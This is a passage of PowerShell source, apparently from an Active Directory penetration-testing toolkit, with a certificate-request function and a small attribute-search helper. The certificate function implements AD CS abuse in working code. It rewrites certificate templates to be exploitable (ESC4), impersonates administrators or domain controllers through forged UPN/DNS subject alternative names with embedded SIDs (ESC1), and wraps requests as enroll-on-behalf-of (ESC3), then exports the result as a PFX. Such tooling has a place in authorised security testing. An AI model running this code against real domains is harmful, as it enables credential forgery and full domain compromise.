                Write-Warning "[!] Cannot reach CA server '$($candidateCAs[0].DNSHostName)': $lastError"
            }
            else {
                Write-Warning "[!] None of the $($candidateCAs.Count) candidate CAs are usable (method '$Method'). Last error: $lastError"
            }
            return $null
        }

        Show-Line "Requesting certificate from CA '$CAServer' (method: $resolvedMethod) using template '$TemplateName'" -Class Note

        # === Step 1c: ModifyTemplate - Backup and modify template (ESC4) ===
        $templateBackupPath = $null
        $templateModified = $false

        if ($ModifyTemplate) {
            # Build connection params for Set-CertificateTemplate
            $templateParams = @{}
            if ($Domain) { $templateParams['Domain'] = $Domain }
            if ($Server) { $templateParams['Server'] = $Server }

            # Ensure LDAP connection for template operations
            if (-not (Ensure-LDAPConnection @templateParams)) {
                Write-Warning "[!] LDAP connection required for -ModifyTemplate. Use Connect-adPEAS first."
                return $null
            }

            # Backup template before modification
            $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
            $templateBackupPath = "${TemplateName}_backup_${timestamp}.json"

            Show-Line "Backing up template '$TemplateName' before modification" -Class Note
            try {
                Set-CertificateTemplate -Identity $TemplateName -Export $templateBackupPath @templateParams
            }
            catch {
                Write-Warning "[!] Failed to backup template: $_"
                return $null
            }

            if (-not (Test-Path -Path $templateBackupPath)) {
                Write-Warning "[!] Template backup file was not created. Aborting to prevent data loss."
                return $null
            }

            Show-Line "Template backup saved to: $templateBackupPath" -Class Hint

            # Modify template for ESC1 exploitation
            Show-Line "Modifying template '$TemplateName' for certificate request" -Class Note
            try {
                Set-CertificateTemplate -Identity $TemplateName `
                    -AllowEnrolleeSuppliesSubject `
                    -AddClientAuthentication `
                    -AllowExportableKey `
                    -RemoveManagerApproval `
                    @templateParams -Confirm:$false

                $templateModified = $true
                Show-Line "Template modified successfully (ENROLLEE_SUPPLIES_SUBJECT, Client Auth EKU, Exportable Key, No Manager Approval)" -Class Hint
            }
            catch {
                # Permission pre-check failure: no changes were made, skip restore
                if ("$_" -match "Insufficient permissions to modify template") {
                    return $null
                }

                # Other errors: changes may have been partially applied, attempt restore
                Write-Warning "[!] Failed to modify template: $_"
                Show-Line "Attempting to restore original template from backup" -Class Note
                try {
                    Set-CertificateTemplate -Identity $TemplateName -Import $templateBackupPath @templateParams -Confirm:$false
                    Show-Line "Original template restored successfully" -Class Hint
                }
                catch {
                    Write-Warning "[!] CRITICAL: Failed to restore template! Manual restore required from: $templateBackupPath"
                }
                return $null
            }
        }

        # Wrap remaining steps in try/finally to ensure template restore on any failure
        try {
            # === Step 2: Resolve Subject and SAN parameters ===
            # Priority: -Impersonate > -Subject/-UPN/-DNS > -AlternativeNames > defaults
            $resolvedSubjectDN = $null
            $resolvedSANs = @()

            # Get domain suffix from session for UPN construction
            $sessionDomain = $null
            if ($Script:LDAPContext -and $Script:LDAPContext['Domain']) {
                $sessionDomain = $Script:LDAPContext['Domain']
            }

            if ($Impersonate) {
                # -Impersonate: derive Subject and SAN from a single value
                # Detection: UPN (has @), FQDN (has dots like srv-dc.contoso.com), or simple name
                if ($Impersonate -match '@') {
                    # Full UPN provided: "administrator@contoso.com"
                    $impersonateUPN = $Impersonate
                    $impersonateUser = ($Impersonate -split '@')[0]
                    $resolvedSubjectDN = "CN=$impersonateUser"
                    $resolvedSANs = @("UPN:$impersonateUPN")
                    Write-Log "$FunctionPrefix Impersonate resolved as UPN: Subject=$resolvedSubjectDN, UPN=$impersonateUPN"
                }
                elseif ($Impersonate -match '^[^@]+\.[^@]+\.[^@]+$') {
                    # FQDN format: "srv-dc.contoso.com" (at least two dots, no @)
                    # Computer certificates use DNS SAN, not UPN
                    $hostPart = ($Impersonate -split '\.')[0]
                    $resolvedSubjectDN = "CN=$hostPart"
                    $resolvedSANs = @("DNS:$Impersonate")
                    Write-Log "$FunctionPrefix Impersonate resolved as DNS (FQDN): Subject=$resolvedSubjectDN, DNS=$Impersonate"
                }
                else {
                    # Simple username: "administrator" or short hostname: "srv-dc"
                    $impersonateUser = $Impersonate
                    if ($sessionDomain) {
                        $impersonateUPN = "$Impersonate@$sessionDomain"
                    }
                    elseif ($Domain) {
                        $impersonateUPN = "$Impersonate@$Domain"
                    }
                    else {
                        Write-Warning "[!] Cannot determine domain for UPN. Use full UPN format (user@domain.com) or connect to a domain first."
                        return $null
                    }
                    $resolvedSubjectDN = "CN=$impersonateUser"
                    $resolvedSANs = @("UPN:$impersonateUPN")
                    Write-Log "$FunctionPrefix Impersonate resolved as UPN: Subject=$resolvedSubjectDN, UPN=$impersonateUPN"
                }
            }
            else {
                # Resolve Subject
                if ($Subject) {
                    # Auto-add CN= prefix if no RDN type present
                    if ($Subject -notmatch '^\s*(CN|O|OU|C|ST|L|DC|E)\s*=') {
                        $resolvedSubjectDN = "CN=$Subject"
                    }
                    else {
                        $resolvedSubjectDN = $Subject
                    }
                }
                elseif ($UPN) {
                    # -UPN specified without -Subject: derive CN from UPN (username part)
                    # ESC1 pattern for user impersonation:
                    #   -UPN administrator@contoso.com  ->  Subject: CN=administrator
                    $upnUser = ($UPN -split '@')[0]
                    $resolvedSubjectDN = "CN=$upnUser"
                    Write-Log "$FunctionPrefix No -Subject specified, derived from -UPN: $resolvedSubjectDN"
                }
                elseif ($DNS) {
                    # -DNS specified without -Subject: derive CN from first DNS name (hostname part)
                    # ESC1 pattern for computer account impersonation:
                    #   -DNS srv-dc.contoso.com  ->  Subject: CN=srv-dc
                    $firstDNS = $DNS[0]
                    $hostPart = ($firstDNS -split '\.')[0]
                    $resolvedSubjectDN = "CN=$hostPart"
                    Write-Log "$FunctionPrefix No -Subject specified, derived from -DNS: $resolvedSubjectDN"
                }
                elseif ($OnBehalfOf) {
                    # ESC3: inner CSR subject = CN of the on-behalf-of user (domain stripped)
                    $oboUser = $OnBehalfOf
                    if ($oboUser -match '\\(.+)$') { $oboUser = $Matches[1] }
                    $resolvedSubjectDN = "CN=$oboUser"
                    Write-Log "$FunctionPrefix No -Subject specified, derived from -OnBehalfOf: $resolvedSubjectDN"
                }
                else {
                    # Default: current user from session
                    $currentUser = $null
                    if ($Script:LDAPContext -and $Script:LDAPContext['Username']) {
                        $currentUser = $Script:LDAPContext['Username']
                        if ($currentUser -match '\\(.+)$') {
                            $currentUser = $Matches[1]
                        }
                    }
                    if (-not $currentUser) {
                        $currentUser = [Environment]::UserName
                    }
                    $resolvedSubjectDN = "CN=$currentUser"
                }

                # Resolve SANs: -UPN, -DNS, and -AlternativeNames are additive
                if ($UPN) {
                    # Auto-append domain if UPN has no @ suffix
                    $resolvedUPN = $UPN
                    if ($resolvedUPN -notmatch '@') {
                        $upnDomain = if ($sessionDomain) { $sessionDomain } elseif ($Domain) { $Domain } else { $null }
                        if ($upnDomain) {
                            $resolvedUPN = "$UPN@$upnDomain"
                            Write-Log "$FunctionPrefix Auto-appended domain to UPN: $resolvedUPN"
                        }
                        else {
                            Write-Warning "[!] UPN '$UPN' has no domain suffix and no domain context available. Use full UPN format (user@domain.com)."
                            return $null
                        }
                    }
                    $resolvedSANs += "UPN:$resolvedUPN"
                }
                if ($DNS) {
                    foreach ($dnsName in $DNS) {
                        $resolvedSANs += "DNS:$dnsName"
                    }
                }
                if ($AlternativeNames) {
                    $resolvedSANs += $AlternativeNames
                }
            }

            Write-Log "$FunctionPrefix Subject: $resolvedSubjectDN"
            if ($resolvedSANs.Count -gt 0) {
                Write-Log "$FunctionPrefix SANs: $($resolvedSANs -join ', ')"
            }

            # Footgun guard: -Subject is literal (it only sets the DN). AD maps
            # certificates via the SAN (UPN/DNS) + SID, not the Subject DN. If the
            # Subject looks like a UPN or FQDN but no SAN was supplied, the issued
            # certificate will not map to that principal - warn and point to -UPN/-DNS/-Impersonate.
            if ($resolvedSANs.Count -eq 0 -and -not $OnBehalfOf) {
                $cnValue = if ($resolvedSubjectDN -match 'CN=([^,]+)') { $Matches[1].Trim() } else { '' }
                if ($cnValue -match '@') {
                    Show-Line "Subject '$cnValue' looks like a UPN but no SAN was set - the certificate will NOT map to that user. Use -UPN or -Impersonate for impersonation." -Class Finding
                }
                elseif ($cnValue -match '^[^@\s]+\.[^@\s]+$') {
                    Show-Line "Subject '$cnValue' looks like a DNS/FQDN but no SAN was set - the certificate will NOT map to that host. Use -DNS or -Impersonate." -Class Finding
                }
            }

            # === Step 2b: Resolve the SID for strong certificate mapping ===
            # On DCs with StrongCertificateBindingEnforcement (KB5014754, mandatory
            # since Feb 2025) the issued certificate must carry the target principal's
            # SID in the NTDS CA Security Extension, otherwise PKINIT mapping fails.
            $resolvedSID = $null
            if ($NoSID) {
                Write-Log "$FunctionPrefix -NoSID specified, skipping SID extension"
            }
            elseif ($SID) {
                $resolvedSID = $SID
                Write-Log "$FunctionPrefix Using explicit -SID: $resolvedSID"
            }
            else {
                # Derive the identity whose SID we should embed.
                # For on-behalf-of, the issued cert belongs to that principal.
                $sidTargetIdentity = $null
                $upnSan = $resolvedSANs | Where-Object { $_ -match '^UPN:' } | Select-Object -First 1
                $dnsSan = $resolvedSANs | Where-Object { $_ -match '^DNS:' } | Select-Object -First 1
                if ($OnBehalfOf) {
                    $sidTargetIdentity = $OnBehalfOf
                }
                elseif ($upnSan) {
                    $sidTargetIdentity = ($upnSan -split ':', 2)[1]
                }
                elseif ($dnsSan) {
                    # Computer account: sAMAccountName is "<hostname>$"
                    $dnsValue = ($dnsSan -split ':', 2)[1]
                    $sidTargetIdentity = "$(($dnsValue -split '\.')[0])`$"
                }
                elseif ($resolvedSubjectDN -match 'CN=([^,]+)') {
                    $sidTargetIdentity = $Matches[1].Trim()
                }

                if ($sidTargetIdentity -and $Script:LdapConnection) {
                    Write-Log "$FunctionPrefix Attempting SID auto-resolution for '$sidTargetIdentity'"
                    try {
                        $resolvedSID = ConvertTo-SID -Identity $sidTargetIdentity
                    }
                    catch {
                        Write-Log "$FunctionPrefix SID auto-resolution threw: $_"
                    }
                    if ($resolvedSID) {
                        Show-Line "Auto-resolved SID for '$sidTargetIdentity': $resolvedSID (embedding NTDS CA Security Extension for strong mapping)" -Class Hint
                    }
                    else {
                        Show-Line "Could not resolve a SID for '$sidTargetIdentity'. On patched DCs the certificate may not map - supply -SID explicitly, or use -NoSID to silence this." -Class Hint
                    }
                }
                elseif (-not $Script:LdapConnection) {
                    Write-Log "$FunctionPrefix No LDAP session for SID auto-resolution; supply -SID for strong mapping"
                }
            }

            # === Step 3: Generate CSR ===
            $csrResult = $null
            try {
                $csrParams = @{
                    SubjectDN = $resolvedSubjectDN
                    KeyLength = $KeyLength
                }
                if ($resolvedSANs.Count -gt 0) {
                    $csrParams['AlternativeNames'] = $resolvedSANs
                }
                if ($resolvedSID) {
                    $csrParams['SID'] = $resolvedSID
                }
                if ($ApplicationPolicies -and $ApplicationPolicies.Count -gt 0) {
                    $csrParams['ApplicationPolicies'] = $ApplicationPolicies
                }
                $csrResult = New-PKCS10Request @csrParams
            }
            catch {
                Write-Warning "[!] Failed to generate CSR: $_"
                return $null
            }

            Show-Line "Generated $KeyLength-bit RSA key pair and PKCS#10 CSR" -Class Note

            $rsa = $csrResult.RSAKey
            try {
                # === Step 3b: Wrap into a PKCS#7 enroll-on-behalf-of envelope (ESC3) ===
                # The submission payload is the bare CSR unless on-behalf-of, in which
                # case it is a SignedData envelope signed by the agent certificate.
                $submissionBase64 = $csrResult.CSRBase64
                $submissionIsPKCS7 = $false
                if ($OnBehalfOf) {
                    Show-Line "Wrapping request as enroll-on-behalf-of '$OnBehalfOf' (signed by agent certificate)" -Class Note
                    $p7Base64 = New-EnrollOnBehalfOfRequest -InnerCsrDer $csrResult.CSRBytes `
                        -OnBehalfOf $OnBehalfOf -AgentCert $oboAgentCert
                    if (-not $p7Base64) {
                        Write-Warning "[!] Failed to build the on-behalf-of request."
                        return $null
                    }
                    $submissionBase64 = $p7Base64
                    $submissionIsPKCS7 = $true
                }

                # === Step 4: Submit CSR to CA via the selected transport ===
                $submitResult = $null

                if ($resolvedMethod -eq 'COM') {
                    # COM/RPC was selected directly (web absent or -Method COM)
                    Write-Log "$FunctionPrefix Submitting via COM/RPC to CA '$resolvedCAName'"
                    $comResult = Submit-COMRequest -CAServer $CAServer `
                        -CAName $resolvedCAName `
                        -CSRBase64 $submissionBase64 `
                        -TemplateName $TemplateName `
                        -Credential $Credential `
                        -IsPKCS7:$submissionIsPKCS7

                    if ($comResult.Success) {
                        $submitResult = @{
                            Success      = $true
                            Status       = 'Issued'
                            RequestID    = $comResult.RequestID
                            Certificate  = $comResult.Certificate   # X509Certificate2
                            ErrorMessage = $null
                            RawResponse  = $null
                        }
                        Show-Line "Certificate issued via COM/RPC (Request ID: $($comResult.RequestID))" -Class Hint
                    }
                    else {
                        Write-Warning "[!] COM/RPC request failed: $($comResult.ErrorMessage)"
                        return $null
                    }
                }
                else {
                    # Web enrollment (certsrv)
                    Write-Log "$FunctionPrefix Submitting via Web Enrollment (http=$resolvedUseHTTP)"
                    $submitResult = Submit-CertsrvRequest -CAServer $CAServer `
                        -CSRBase64 $submissionBase64 `
                        -TemplateName $TemplateName `
                        -Credential $Credential `
                        -UseHTTP:$resolvedUseHTTP `
                        -Port $Port

                    # Only a genuine TRANSPORT failure triggers the COM/RPC fallback.
                    # Auth/Denied responses are real CA answers, not transport problems,
                    # so they must NOT silently retry over COM.
                    $isTransportFailure = ($submitResult.Status -eq 'Error' -and
                        $submitResult.ErrorMessage -match 'connect|connection|timeout|refused|unreachable')

                    if ($isTransportFailure -and $comEligible -and $resolvedCAName) {
                        Show-Line "Web Enrollment transport error ($($submitResult.ErrorMessage)), attempting COM/RPC fallback..." -Class Hint
                        Write-Log "$FunctionPrefix Web Enrollment transport failure, trying COM/RPC with CA '$resolvedCAName'"

                        $comResult = Submit-COMRequest -CAServer $CAServer `
                            -CAName $resolvedCAName `
                            -CSRBase64 $submissionBase64 `
                            -TemplateName $TemplateName `
                            -Credential $Credential `
                            -IsPKCS7:$submissionIsPKCS7

                        if ($comResult.Success) {
                            $submitResult = @{
                                Success      = $true
                                Status       = 'Issued'
                                RequestID    = $comResult.RequestID
                                Certificate  = $comResult.Certificate   # X509Certificate2
                                ErrorMessage = $null
                                RawResponse  = $null
                            }
                            Show-Line "Certificate issued via COM/RPC fallback (Request ID: $($comResult.RequestID))" -Class Hint
                        }
                        else {
                            Write-Warning "[!] Both Web Enrollment and COM/RPC failed"
                            Write-Warning "[!] Web Enrollment: $($submitResult.ErrorMessage)"
                            Write-Warning "[!] COM/RPC: $($comResult.ErrorMessage)"
                            return $null
                        }
                    }
                    elseif ($submitResult.Status -in @('AuthError', 'Denied', 'Error')) {
                        # Non-recoverable web result (no fallback eligible/possible)
                        if ($isTransportFailure -and -not $resolvedCAName) {
                            Write-Log "$FunctionPrefix Transport failure but no CA name known for COM/RPC fallback (use -CAName)"
                        }
                        Write-Warning "[!] $($submitResult.ErrorMessage)"
                        return $null
                    }
                }

                if ($submitResult.Status -eq 'Pending') {
                    Show-Line "Certificate request is pending approval (Request ID: $($submitResult.RequestID))" -Class Hint
                    Show-Line "The CA administrator must approve this request before the certificate can be retrieved."

                    # Persist the private key so the certificate can be paired into a
                    # PFX after approval via -RetrieveID. Without this the key is lost
                    # when this call returns and the issued certificate is unusable.
                    $savedKeyPath = $null
                    try {
                        $cnForKey = if ($resolvedSubjectDN -match 'CN=([^,]+)') { $Matches[1].Trim() } else { 'certificate' }
                        $savedKeyPath = Save-PendingPrivateKey -RSA $rsa -RequestID $submitResult.RequestID `
                            -Subject $resolvedSubjectDN -CAServer $CAServer `
                            -OutputPath "${cnForKey}_req$($submitResult.RequestID).key.json" -Force:$Force
                    }
                    catch {
                        Write-Warning "[!] Could not save the private key for later retrieval: $_"
                    }

                    if ($savedKeyPath) {
                        Show-Line "Private key saved for retrieval: $savedKeyPath" -Class Hint
                        Show-Line "After approval, retrieve with:" -Class Note
                        Show-Line "Request-ADCSCertificate -RetrieveID $($submitResult.RequestID) -CAServer '$CAServer' -KeyFile '$savedKeyPath'"
                    }

                    if ($PassThru) {
                        return [PSCustomObject]@{
                            Success   = $true
                            Status    = 'Pending'
                            RequestID = $submitResult.RequestID
                            CAServer  = $CAServer
                            KeyFile   = $savedKeyPath
                            Message   = "Certificate pending approval. Request ID: $($submitResult.RequestID)"
                        }
                    }
                    return
                }

                if ($submitResult.Status -ne 'Issued' -or -not $submitResult.RequestID) {
                    Write-Warning "[!] Unexpected response from CA"
                    return $null
                }

                # === Step 5: Retrieve Certificate ===
                # COM returns certificate immediately, HTTP/HTTPS requires retrieval
                if ($submitResult.Certificate) {
                    # COM path - certificate already in result
                    $issuedCert = $submitResult.Certificate
                    Write-Log "$FunctionPrefix Certificate retrieved from COM result"
                }
                else {
                    # HTTP/HTTPS path - need to retrieve via certsrv
                    Show-Line "Certificate issued (Request ID: $($submitResult.RequestID))" -Class Hint

                    $issuedCert = Get-CertsrvCertificate -CAServer $CAServer `
                        -RequestID $submitResult.RequestID `
                        -Credential $Credential `
                        -UseHTTP:$resolvedUseHTTP `
                        -Port $Port

                    if (-not $issuedCert) {
                        Write-Warning "[!] Failed to retrieve issued certificate"
                        return $null
                    }
                }

                # === Steps 6-8: Build PFX, save, display, return ===
                $pfxResult = Save-IssuedCertificatePFX -IssuedCert $issuedCert -RSA $rsa `
                    -OutputPath $OutputPath -NoPassword:$NoPassword `
                    -TemplateName $TemplateName -RequestID $submitResult.RequestID -CAServer $CAServer `
                    -Force:$Force
                if (-not $pfxResult) {
                    return $null
                }
                if ($PassThru) {
                    return $pfxResult
                }
            }
            finally {
                if ($rsa) { $rsa.Dispose() }
            }
        }
        finally {
            # === Template Restore (always runs if template was modified) ===
            if ($templateModified -and $templateBackupPath) {
                Show-EmptyLine
                Show-Line "Restoring original template '$TemplateName' from backup" -Class Note
                try {
                    $restoreParams = @{}
                    if ($Domain) { $restoreParams['Domain'] = $Domain }
                    if ($Server) { $restoreParams['Server'] = $Server }

                    Set-CertificateTemplate -Identity $TemplateName -Import $templateBackupPath @restoreParams -Confirm:$false
                    Show-Line "Original template restored successfully" -Class Hint
                    Show-Line "Backup file kept for audit: $templateBackupPath" -Class Note
                }
                catch {
                    Write-Warning "[!] CRITICAL: Failed to restore template '$TemplateName'!"
                    Write-Warning "[!] Manual restore required: Set-CertificateTemplate -Identity '$TemplateName' -Import '$templateBackupPath'"
                }
            }
        }
    }
}

#endregion



# ----- Search-Value.ps1 -----

<#
.SYNOPSIS
    Searches all attribute values of pipeline objects for a given pattern.

.DESCRIPTION
    Search-Value accepts AD objects from the pipeline (e.g., from Get-DomainUser,
    Get-DomainGroup, Get-DomainComputer) and searches all property values for a
    matching string. Matching objects are displayed with their identity and the
    properties that contain the match.

    By default, performs a case-insensitive wildcard search (*pattern*).
    Use -Exact for exact string matching or -Regex for regular expression matching.
    Use -Property to restrict the search to specific attributes.

.PARAMETER Pattern
    The search pattern. By default used as wildcard (*Pattern*).
    With -Exact: exact string comparison.
    With -Regex: regular expression.

.PARAMETER InputObject
    The object to search (from pipeline).

.PARAMETER Property
    Optional array of property names to search. If not specified, all properties are searched.

.PARAMETER Exact
    Perform exact string matching instead of wildcard.

.PARAMETER Regex
    Interpret Pattern as a regular expression.

.EXAMPLE
    Get-DomainUser | Search-Value "admin"
    Searches all user attributes for the string "admin".

.EXAMPLE
    Get-DomainUser | Search-Value "admin" -Property description,name
    Searches only the description and name attributes.

.EXAMPLE
    Get-DomainGroup | Search-Value "^Domain" -Regex
    Searches group attributes using a regular expression.

.EXAMPLE
    Get-DomainComputer | Search-Value "Windows Server 2019" -Exact
    Searches for an exact match of the string.

.OUTPUTS
    Console output with matching objects and their matching properties.

.NOTES
    Author: Alexander Sturz (@yourway_sec)
#>
function Search-Value {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, Position=0)]
        [string]$Pattern,

        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [PSObject]$InputObject,

        [Parameter(Mandatory=$false)]
        [string[]]$Property,

        [Parameter(Mandatory=$false)]
        [switch]$Exact,

        [Parameter(Mandatory=$false)]
        [switch]$Regex
    )

    process {
        # Get properties to search
        $propsToSearch = if ($Property) {
            $InputObject.PSObject.Properties | Where-Object { $_.Name -in $Property }
        } else {
            $InputObject.PSObject.Properties
        }

        $matchResults = @()
        foreach ($prop in $propsToSearch) {
            # Skip binary/byte[] and null values
            if ($null -eq $prop.Value) { continue }
            if ($prop.Value -is [byte[]]) { continue }

            # Convert value to searchable string(s)
            $searchValues = if ($prop.Value -is [array]) {
                $prop.Value | ForEach-Object { "$_" }
            } else {
                @("$($prop.Value)")
            }

            foreach ($val in $searchValues) {
                $isMatch = if ($Exact) {
                    $val -eq $Pattern
                } elseif ($Regex) {
                    $val -match $Pattern
                } else {
                    $val -like "*$Pattern*"
                }

                if ($isMatch) {
                    $matchResults += [PSCustomObject]@{
                        Property = $prop.Name
                        Value    = $val
                    }
                }
            }
        }

        if ($matchResults.Count -gt 0) {
            # Determine object identity
            $identity = if ($InputObject.sAMAccountName) { $InputObject.sAMAccountName }
                       elseif ($InputObject.name) { $InputObject.name }
                       elseif ($InputObject.distinguishedName) { $InputObject.distinguishedName }
                       else { "(object)" }

            Write-Host "  $identity" -ForegroundColor Yellow
            foreach ($m in $matchResults) {
                Write-Host "    $($m.Property): " -ForegroundColor Cyan -NoNewline
                Write-Host "$($m.Value)" -ForegroundColor White
            }
        }
    }
}




